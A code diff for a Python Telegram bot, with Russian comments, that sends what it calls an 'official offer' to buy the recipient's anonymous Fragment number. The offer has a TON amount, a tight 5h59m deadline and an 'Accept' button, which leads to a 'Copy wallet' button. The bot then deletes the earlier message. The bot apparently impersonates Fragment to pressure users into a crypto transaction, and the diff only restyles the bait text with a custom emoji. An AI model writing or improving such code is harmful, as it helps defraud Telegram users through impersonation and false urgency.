@@ -15,6 +15,9 @@ dispatcher = Dispatcher()
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
+CUSTOM_EMOJI_ID = "6023826881160157558" # Твой эмодзи
+
+CUSTOM_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_EMOJI_ID}">💎</tg-emoji>'
 
 # Функция безопасного удаления
 async def safe_delete(chat_id, message_id, conn_id=None):
@@ -72,11 +75,9 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # Официальный текст оффера
+    # НОВЫЙ ТЕКСТ С ЭМОДЗИ
     offer_text = (
-        f"<b>Fragment</b>\n"
-        f"<b>Buy {formatted_phone}</b>\n\n"
-        f"Поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
+        f"{CUSTOM_EMOJI} Вам поступило официальное предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
         f"Срок действия: <b>5ч 59м</b>\n\n"
         f"<i>Для рассмотрения предложения и запуска процедуры передачи, нажмите «Принять».</i>"
@@ -129,7 +130,6 @@ async def on_accept_offer(callback: CallbackQuery):
         [InlineKeyboardButton(text="Скопировать кошелек", callback_data="copy_wallet")]
     ])
 
-    # 1. Отправляем новое сообщение
     try:
         await bot.send_message(
             chat_id=callback.message.chat.id,
@@ -140,7 +140,6 @@ async def on_accept_offer(callback: CallbackQuery):
     except Exception as e:
         print(f"Ошибка отправки: {e}")
 
-    # 2. Ждем полсекунды и жестко удаляем старое
     await asyncio.sleep(0.5)
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
 
